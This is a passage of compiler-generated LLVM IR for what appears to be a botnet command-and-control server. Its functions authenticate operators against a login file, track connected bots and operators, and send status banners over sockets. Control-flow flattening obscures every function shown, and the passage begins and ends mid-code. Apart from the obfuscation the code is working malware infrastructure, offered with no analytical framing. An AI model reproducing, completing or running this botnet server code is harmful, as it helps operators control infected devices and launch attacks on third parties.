; <label>:7:                                      ; preds = %loopEntry
  %8 = load i32, i32* %1, align 4
  %9 = sext i32 %8 to i64
  %10 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %9
  %11 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %10, i32 0, i32 1
  %12 = load i8, i8* %11, align 4
  %13 = icmp ne i8 %12, 0
  %14 = select i1 %13, i32 1260986192, i32 2090580668
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  store i32 1741158851, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i32, i32* %2, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %2, align 4
  store i32 1741158851, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %1, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %1, align 4
  store i32 -1689519417, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %2, align 4
  ret i32 %23

loopEnd:                                          ; preds = %19, %16, %15, %7, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i8* @TitleWriter(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  %switchVar = alloca i32
  store i32 2008865902, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2008865902, label %7
    i32 1726861934, label %20
    i32 -83142805, label %21
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 2048, i32 16, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %10 = call i32 @BotsConnected()
  %11 = load volatile i32, i32* @OperatorsConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i32 27, i32 %10, i32 %11, i32 7) #7
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %16 = call i64 @strlen(i8* %15) #8
  %17 = call i64 @send(i32 %13, i8* %14, i64 %16, i32 16384)
  %18 = icmp eq i64 %17, -1
  %19 = select i1 %18, i32 1726861934, i32 -83142805
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  ret i8* null

; <label>:21:                                     ; preds = %loopEntry
  %22 = call i32 @sleep(i32 2)
  store i32 2008865902, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %21, %7, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @Find_Login(i8*) #0 {
  %.reg2mem = alloca %struct._IO_FILE*
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %.reg2mem
  %.reload2 = load volatile %struct._IO_FILE*, %struct._IO_FILE** %.reg2mem
  store %struct._IO_FILE* %.reload2, %struct._IO_FILE** %4, align 8
  %switchVar = alloca i32
  store i32 357034062, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 357034062, label %first
    i32 -1146587861, label %12
    i32 1390780188, label %13
    i32 -309571409, label %14
    i32 -1056368194, label %20
    i32 -1454445269, label %26
    i32 -1440772045, label %30
    i32 145781784, label %33
    i32 690992145, label %37
    i32 -417855433, label %40
    i32 1927622975, label %44
    i32 307270469, label %45
    i32 -1165719856, label %47
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct._IO_FILE*, %struct._IO_FILE** %.reg2mem
  %10 = icmp eq %struct._IO_FILE* %.reload, null
  %11 = select i1 %10, i32 -1146587861, i32 1390780188
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 -1165719856, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 -309571409, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %16 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %17 = call i8* @fgets(i8* %15, i32 512, %struct._IO_FILE* %16)
  %18 = icmp ne i8* %17, null
  %19 = select i1 %18, i32 -1056368194, i32 145781784
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %22 = load i8*, i8** %3, align 8
  %23 = call i8* @strstr(i8* %21, i8* %22) #8
  %24 = icmp ne i8* %23, null
  %25 = select i1 %24, i32 -1454445269, i32 -1440772045
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32, i32* %6, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* %6, align 4
  %29 = load i32, i32* %5, align 4
  store i32 %29, i32* %7, align 4
  store i32 -1440772045, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %5, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %5, align 4
  store i32 -309571409, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = icmp ne %struct._IO_FILE* %34, null
  %36 = select i1 %35, i32 690992145, i32 -417855433
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %39 = call i32 @fclose(%struct._IO_FILE* %38)
  store i32 -417855433, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %6, align 4
  %42 = icmp eq i32 %41, 0
  %43 = select i1 %42, i32 1927622975, i32 307270469
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1165719856, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %7, align 4
  store i32 %46, i32* %2, align 4
  store i32 -1165719856, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %2, align 4
  ret i32 %48

loopEnd:                                          ; preds = %45, %44, %40, %37, %33, %30, %26, %20, %14, %13, %12, %first, %switchDefault
  br label %loopEntry
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define i8* @BotWorker(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca %struct._IO_FILE*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca [80 x i8], align 16
  %17 = alloca [5000 x i8], align 16
  %18 = alloca [5000 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [5000 x i8], align 16
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [80 x i8], align 16
  %27 = alloca [2048 x i8], align 16
  %28 = alloca [2048 x i8], align 16
  %29 = alloca [2048 x i8], align 16
  %30 = alloca [80 x i8], align 16
  %31 = alloca [80 x i8], align 16
  %32 = alloca [80 x i8], align 16
  %33 = alloca [80 x i8], align 16
  %34 = alloca [80 x i8], align 16
  %35 = alloca [80 x i8], align 16
  %36 = alloca [80 x i8], align 16
  %37 = alloca [80 x i8], align 16
  %38 = alloca [80 x i8], align 16
  %39 = alloca [80 x i8], align 16
  %40 = alloca [80 x i8], align 16
  %41 = alloca [80 x i8], align 16
  %42 = alloca [80 x i8], align 16
  %43 = alloca [80 x i8], align 16
  %44 = alloca [80 x i8], align 16
  %45 = alloca [80 x i8], align 16
  %46 = alloca [80 x i8], align 16
  %47 = alloca [80 x i8], align 16
  %48 = alloca [80 x i8], align 16
  %49 = alloca [80 x i8], align 16
  %50 = alloca [80 x i8], align 16
  %51 = alloca [80 x i8], align 16
  %52 = alloca [2048 x i8], align 16
  %53 = alloca [2048 x i8], align 16
  %54 = alloca [80 x i8], align 16
  %55 = alloca [80 x i8], align 16
  %56 = alloca [2048 x i8], align 16
  %57 = alloca %struct._IO_FILE*, align 8
  %58 = alloca i64, align 8
  %59 = alloca %struct.tm*, align 8
  %60 = alloca [50 x i8], align 16
  %61 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %62 = load i8*, i8** %3, align 8
  %63 = ptrtoint i8* %62 to i32
  store i32 %63, i32* %4, align 4
  %64 = load volatile i32, i32* @OperatorsConnected, align 4
  %65 = add nsw i32 %64, 1
  store volatile i32 %65, i32* @OperatorsConnected, align 4
  %66 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %66, i8 0, i64 2048, i32 16, i1 false)
  %67 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %67, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %12, align 4
  %68 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0))
  store %struct._IO_FILE* %68, %struct._IO_FILE** %11, align 8
  %switchVar = alloca i32
  store i32 -1638260130, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1638260130, label %69
    i32 -930461771, label %75
    i32 -580589688, label %80
    i32 -525820776, label %82
    i32 -1023880075, label %88
    i32 1566796769, label %103
    i32 740101893, label %108
    i32 1457108269, label %109
    i32 252559428, label %115
    i32 -2071120063, label %116
    i32 -1443179833, label %137
    i32 1461249671, label %142
    i32 -1460963331, label %143
    i32 -407471598, label %149
    i32 1082955123, label %150
    i32 1612459011, label %161
    i32 491748476, label %162
    i32 998905923, label %164
    i32 -1474378910, label %165
    i32 1755571501, label %170
    i32 489290850, label %171
    i32 -300379122, label %181
    i32 -324006305, label %182
    i32 1424922884, label %184
    i32 2020323632, label %222
    i32 308705160, label %223
    i32 1236914878, label %231
    i32 1955634216, label %232
    i32 1180252662, label %240
    i32 1194840686, label %241
    i32 1148891080, label %249
    i32 507647735, label %250
    i32 -1484120794, label %258
    i32 -657352573, label %259
    i32 282661473, label %267
    i32 -1018746327, label %268
    i32 -2006799484, label %276
    i32 367987006, label %277
    i32 -824342281, label %285
    i32 208058654, label %286
    i32 175008985, label %294
    i32 262346526, label %295
    i32 282571259, label %303
    i32 -2008132619, label %304
    i32 1561048898, label %305
    i32 1214681945, label %313
    i32 573167261, label %314
    i32 -1867820169, label %319
    i32 1222667240, label %320
    i32 984919137, label %321
    i32 1144000531, label %328
    i32 571474483, label %334
    i32 -1591416838, label %339
    i32 -1610634910, label %352
    i32 1877745943, label %353
    i32 -669671716, label %358
    i32 -70203003, label %359
    i32 -588624411, label %360
    i32 -802458668, label %365
    i32 382390840, label %378
    i32 777569654, label %379
    i32 -1709050752, label %384
    i32 1441766167, label %385
    i32 -1919100471, label %386
    i32 1671136577, label %391
    i32 -1139839593, label %438
    i32 271366350, label %439
    i32 744563783, label %447
    i32 -1438641444, label %448
    i32 -1118271949, label %456
    i32 -394554014, label %457
    i32 -1561474736, label %465
    i32 -1049881860, label %466
    i32 -108010706, label %474
    i32 915557389, label %475
    i32 -966656365, label %483
    i32 300968012, label %484
    i32 -1502277176, label %492
    i32 -1165067647, label %493
    i32 854007555, label %501
    i32 -834500158, label %502
    i32 -756797605, label %510
    i32 1018982168, label %511
    i32 -905770401, label %519
    i32 271757225, label %520
    i32 382602142, label %528
    i32 -505100064, label %529
    i32 1361008621, label %537
    i32 -1342103423, label %538
    i32 788680319, label %546
    i32 137247968, label %547
    i32 -1946284435, label %555
    i32 -88750752, label %556
    i32 1973352774, label %564
    i32 353588475, label %565
    i32 764111596, label %573
    i32 1847025300, label %574
    i32 2091317294, label %582
    i32 -748877188, label %583
    i32 -971962994, label %590
    i32 -1995128486, label %591
    i32 673677751, label %592
    i32 11937806, label %597
    i32 919011593, label %617
    i32 380123995, label %618
    i32 829758022, label %626
    i32 -444113772, label %627
    i32 280308035, label %635
    i32 -2100934857, label %636
    i32 204865374, label %644
    i32 633174177, label %645
    i32 1582662598, label %653
    i32 -873897785, label %654
    i32 -699587858, label %661
    i32 1322534521, label %662
    i32 -641383057, label %663
    i32 1856069745, label %668
    i32 1259809072, label %679
    i32 -1268359697, label %680
    i32 1541733067, label %685
    i32 381243654, label %686
    i32 -1776664024, label %687
    i32 -1860284401, label %692
    i32 568371587, label %703
    i32 1477970487, label %704
    i32 -1301773804, label %712
    i32 -542013047, label %713
    i32 -901616115, label %721
    i32 -2084009464, label %722
    i32 909478290, label %730
    i32 510713776, label %731
    i32 -1385561681, label %739
    i32 -650621552, label %740
    i32 1537192576, label %748
    i32 -1744522984, label %749
    i32 -1352202265, label %757
    i32 -53188601, label %758
    i32 -195403853, label %766
    i32 1118946659, label %767
    i32 -695787237, label %775
    i32 1431808597, label %776
    i32 614051173, label %784
    i32 670546692, label %785
    i32 -1775226221, label %793
    i32 -1702643348, label %794
    i32 -1779986395, label %795
    i32 2053022746, label %803
    i32 -748142717, label %804
    i32 1749731516, label %809
    i32 -1470992644, label %810
    i32 1908708685, label %811
    i32 -1505928732, label %812
    i32 -544123589, label %817
    i32 -856812949, label %829
    i32 362799522, label %830
    i32 -1272466747, label %837
    i32 -1124478548, label %838
    i32 -1038178638, label %839
    i32 798567121, label %844
    i32 -1034381694, label %856
    i32 390711943, label %857
    i32 -1439198122, label %864
    i32 -678253600, label %865
    i32 874084447, label %866
    i32 845530474, label %871
    i32 1604995869, label %887
    i32 560252558, label %888
    i32 760042236, label %890
    i32 606120163, label %896
    i32 -571384955, label %897
    i32 92113296, label %902
    i32 943982239, label %903
    i32 -682532426, label %936
    i32 -1820737116, label %937
    i32 -885566018, label %946
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  %71 = call i32 @feof(%struct._IO_FILE* %70) #7
  %72 = icmp ne i32 %71, 0
  %73 = xor i1 %72, true
  %74 = select i1 %73, i32 -930461771, i32 -580589688
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  %77 = call i32 @fgetc(%struct._IO_FILE* %76)
  store i32 %77, i32* %13, align 4
  %78 = load i32, i32* %12, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %12, align 4
  store i32 -1638260130, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i32 0, i32* %14, align 4
  %81 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  call void @rewind(%struct._IO_FILE* %81)
  store i32 -525820776, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %14, align 4
  %84 = load i32, i32* %12, align 4
  %85 = sub nsw i32 %84, 1
  %86 = icmp ne i32 %83, %85
  %87 = select i1 %86, i32 -1023880075, i32 1566796769
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  %90 = load i32, i32* %14, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %91
  %93 = getelementptr inbounds %struct.login_info, %struct.login_info* %92, i32 0, i32 0
  %94 = getelementptr inbounds [20 x i8], [20 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %14, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %96
  %98 = getelementptr inbounds %struct.login_info, %struct.login_info* %97, i32 0, i32 1
  %99 = getelementptr inbounds [20 x i8], [20 x i8]* %98, i32 0, i32 0
  %100 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %89, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i32 0, i32 0), i8* %94, i8* %99)
  %101 = load i32, i32* %14, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %14, align 4
  store i32 -525820776, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %4, align 4
  %105 = call i64 @send(i32 %104, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.21, i32 0, i32 0), i64 22, i32 16384)
  %106 = icmp eq i64 %105, -1
  %107 = select i1 %106, i32 740101893, i32 1457108269
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %111 = load i32, i32* %4, align 4
  %112 = call i32 @fdgets(i8* %110, i32 2048, i32 %111)
  %113 = icmp slt i32 %112, 1
  %114 = select i1 %113, i32 252559428, i32 -2071120063
  store i32 %114, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %117)
  %118 = load i32, i32* %5, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %119
  %121 = getelementptr inbounds %struct.login_info, %struct.login_info* %120, i32 0, i32 0
  %122 = getelementptr inbounds [20 x i8], [20 x i8]* %121, i32 0, i32 0
  %123 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %124 = call i32 (i8*, i8*, ...) @sprintf(i8* %122, i8* %123) #7
  %125 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  store i8* %125, i8** %15, align 8
  %126 = load i8*, i8** %15, align 8
  %127 = call i32 @Find_Login(i8* %126)
  store i32 %127, i32* %5, align 4
  %128 = load i8*, i8** %15, align 8
  %129 = load i32, i32* %5, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %130
  %132 = getelementptr inbounds %struct.login_info, %struct.login_info* %131, i32 0, i32 0
  %133 = getelementptr inbounds [20 x i8], [20 x i8]* %132, i32 0, i32 0
  %134 = call i32 @strcmp(i8* %128, i8* %133) #8
  %135 = icmp eq i32 %134, 0
  %136 = select i1 %135, i32 -1443179833, i32 998905923
  store i32 %136, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i32, i32* %4, align 4
  %139 = call i64 @send(i32 %138, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.23, i32 0, i32 0), i64 22, i32 16384)
  %140 = icmp eq i64 %139, -1
  %141 = select i1 %140, i32 1461249671, i32 -1460963331
  store i32 %141, i32* %switchVar
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %145 = load i32, i32* %4, align 4
  %146 = call i32 @fdgets(i8* %144, i32 2048, i32 %145)
  %147 = icmp slt i32 %146, 1
  %148 = select i1 %147, i32 -407471598, i32 1082955123
  store i32 %148, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %151)
  %152 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %153 = load i32, i32* %5, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %154
  %156 = getelementptr inbounds %struct.login_info, %struct.login_info* %155, i32 0, i32 1
  %157 = getelementptr inbounds [20 x i8], [20 x i8]* %156, i32 0, i32 0
  %158 = call i32 @strcmp(i8* %152, i8* %157) #8
  %159 = icmp ne i32 %158, 0
  %160 = select i1 %159, i32 1612459011, i32 491748476
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  store i32 -1474378910, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %163, i8 0, i64 2048, i32 16, i1 false)
  store i32 1424922884, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  store i32 -1474378910, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i32, i32* %4, align 4
  %167 = call i64 @send(i32 %166, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i32 0, i32 0), i64 5, i32 16384)
  %168 = icmp eq i64 %167, -1
  %169 = select i1 %168, i32 1755571501, i32 489290850
  store i32 %169, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %172 = getelementptr inbounds [80 x i8], [80 x i8]* %16, i32 0, i32 0
  %173 = call i32 (i8*, i8*, ...) @sprintf(i8* %172, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.25, i32 0, i32 0)) #7
  %174 = load i32, i32* %4, align 4
  %175 = getelementptr inbounds [80 x i8], [80 x i8]* %16, i32 0, i32 0
  %176 = getelementptr inbounds [80 x i8], [80 x i8]* %16, i32 0, i32 0
  %177 = call i64 @strlen(i8* %176) #8
  %178 = call i64 @send(i32 %174, i8* %175, i64 %177, i32 16384)
  %179 = icmp eq i64 %178, -1
  %180 = select i1 %179, i32 -300379122, i32 -324006305
  store i32 %180, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = call i32 @sleep(i32 5)
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i8*, i8** %3, align 8
  %186 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %185) #7
  %187 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %187, i8 0, i64 2048, i32 16, i1 false)
  %188 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i32 0, i32 0
  %189 = call i32 (i8*, i8*, ...) @sprintf(i8* %188, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.26, i32 0, i32 0)) #7
  %190 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %191 = call i32 (i8*, i8*, ...) @sprintf(i8* %190, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.27, i32 0, i32 0)) #7
  %192 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %193 = call i32 (i8*, i8*, ...) @sprintf(i8* %192, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.28, i32 0, i32 0)) #7
  %194 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %195 = call i32 (i8*, i8*, ...) @sprintf(i8* %194, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.29, i32 0, i32 0)) #7
  %196 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %197 = call i32 (i8*, i8*, ...) @sprintf(i8* %196, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.30, i32 0, i32 0)) #7
  %198 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %199 = call i32 (i8*, i8*, ...) @sprintf(i8* %198, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.31, i32 0, i32 0)) #7
  %200 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %201 = call i32 (i8*, i8*, ...) @sprintf(i8* %200, i8* getelementptr inbounds ([158 x i8], [158 x i8]* @.str.32, i32 0, i32 0)) #7
  %202 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %203 = call i32 (i8*, i8*, ...) @sprintf(i8* %202, i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.33, i32 0, i32 0)) #7
  %204 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %205 = call i32 (i8*, i8*, ...) @sprintf(i8* %204, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i32 0, i32 0)) #7
  %206 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %207 = load i32, i32* %5, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %208
  %210 = getelementptr inbounds %struct.login_info, %struct.login_info* %209, i32 0, i32 0
  %211 = getelementptr inbounds [20 x i8], [20 x i8]* %210, i32 0, i32 0
  %212 = call i32 (i8*, i8*, ...) @sprintf(i8* %206, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.35, i32 0, i32 0), i8* %211) #7
  %213 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %214 = call i32 (i8*, i8*, ...) @sprintf(i8* %213, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.36, i32 0, i32 0)) #7
  %215 = load i32, i32* %4, align 4
  %216 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i32 0, i32 0
  %217 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i32 0, i32 0
  %218 = call i64 @strlen(i8* %217) #8
  %219 = call i64 @send(i32 %215, i8* %216, i64 %218, i32 16384)
  %220 = icmp eq i64 %219, -1
  %221 = select i1 %220, i32 2020323632, i32 308705160
  store i32 %221, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i32, i32* %4, align 4
  %225 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %226 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %227 = call i64 @strlen(i8* %226) #8
  %228 = call i64 @send(i32 %224, i8* %225, i64 %227, i32 16384)
  %229 = icmp eq i64 %228, -1
  %230 = select i1 %229, i32 1236914878, i32 1955634216
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
